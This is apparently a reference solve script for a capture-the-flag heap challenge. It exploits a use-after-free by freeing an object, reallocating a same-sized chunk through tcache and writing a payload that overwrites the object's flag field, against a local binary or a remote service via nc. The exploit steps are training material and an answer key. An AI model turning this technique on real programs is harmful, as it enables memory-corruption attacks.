#!/bin/sh
# Reference solution (shell form) for cylab-heap-3 (use-after-free).
# Free x (option 5) without clearing it, then allocate a new chunk of the
# same size as struct object (35 bytes) (option 2); tcache hands back the
# very memory x still points to. Write a[10]+b[10]+c[10]+"pico" so the
# last field lands on x->flag, then check for the win (option 4).
#
# Usage:
#   ./solve.sh               solve a local ./chall  (needs ./chall and ./flag.txt here)
#   ./solve.sh HOST PORT     solve a deployed service over the network, via nc

PAYLOAD="AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico"

send() {
	printf '5\n2\n35\n%s\n4\n' "$PAYLOAD"
}

if [ "$#" -ge 2 ]; then
	send | nc "$1" "$2"
else
	send | ./chall
fi
